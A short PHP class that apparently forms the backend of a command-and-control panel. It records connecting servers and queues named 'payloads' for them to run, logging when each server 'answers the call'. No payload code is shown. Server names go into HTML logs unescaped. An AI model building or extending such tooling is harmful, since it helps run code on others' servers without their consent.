<?php
class Server
{
	// Check if a server exists and returns their ip or id
	public function GetServerByIP($ip)
	{
		if($GLOBALS['DB']->Count("server_list", ["server_ip" => $ip]) == 1)
		{
			$server_id = $GLOBALS['DB']->GetContent("server_list", ["server_ip" => $ip])[0]["id"];
			return $server_id;
		}
		else
		{
			return false;
		}
	}

	// Get the payload to be used by the server
	public function GetServerPayload($server_id)
	{
		return $GLOBALS['DB']->GetContent("server_list", ["id" => $server_id])[0]["payload_call"];
	}

	// Get the server
	public function GetServer($server_id)
	{
		return $GLOBALS['DB']->GetContent("server_list", ["id" => $server_id])[0];
	}

	// Add the server
	public function AddServer($name, $ip, $users)
	{
		$GLOBALS['DB']->Insert("server_list", ["server_name" => $name, "server_ip" => $ip, "server_users" => $users, "last_update" => time(), "payload_call" => -1]);
        Logs::AddLogs("<p class='text-primary'>[".date('d/m/Y at H:i:s', time())."]&nbsp;<i class='fa fa-plus'></i>&nbsp;A new server has connected: ".$name."</p>");
	}

	// Update a server
	public function UpdateServer($server_id, $name, $ip, $users)
	{
		$GLOBALS['DB']->Update("server_list", ["id" => $server_id], ["server_name" => $name, "server_users" => $users, "last_update" => time()]);
	}

	// Get all servers
	public function GetAllServer()
	{
		return $GLOBALS['DB']->GetContent("server_list");
	}

	// Delete the server
	public function DeleteServer($id)
	{
		$ip = Server::GetServer($id)['server_ip'];
		return $GLOBALS['DB']->Delete("server_list", ["id" => $id]);
	    Logs::AddLogs("<p class='text-danger'>[".date('d/m/Y at H:i:s', time())."]&nbsp;<i class='fa fa-close'></i>&nbsp;The server ".$ip." has been deleted</p>");
	}

	// Apply a payload
	public function CallPayload($server_id, $payload_id)
	{
		$ip = Server::GetServer($server_id)['server_ip'];
		$pname = Payload::GetPayload($payload_id)['payload_name'];
		$GLOBALS['DB']->Update("server_list", ["id" => $server_id], ["payload_call" => $payload_id]);
        Logs::AddLogs("<p class='text-warning'>[".date('d/m/Y at H:i:s', time())."]&nbsp;<i class='fa fa-exclamation'></i>&nbsp;The payload \"".$pname."\" was called for ".$ip."</p>");
	}

	// Reset a payload on the server
	public function ResetPayload($server_id)
	{
		$ip = Server::GetServer($server_id)['server_ip'];
		$GLOBALS['DB']->Update("server_list", ["id" => $server_id], ["payload_call" => -1]);
        Logs::AddLogs("<p class='text-success'>[".date('d/m/Y at H:i:s', time())."]&nbsp;<i class='fa fa-check'></i>&nbsp;The server ".$ip." answered the call</p>");
	}

	// Get the status of a payload call
	public function CallStatut($server_id)
	{
		if ($GLOBALS['DB']->GetContent("server_list", ["id" => $server_id])[0]['payload_call'] == -1)
		{
			return true;
		}
		else
		{
			return false;
		}
	}
}
?>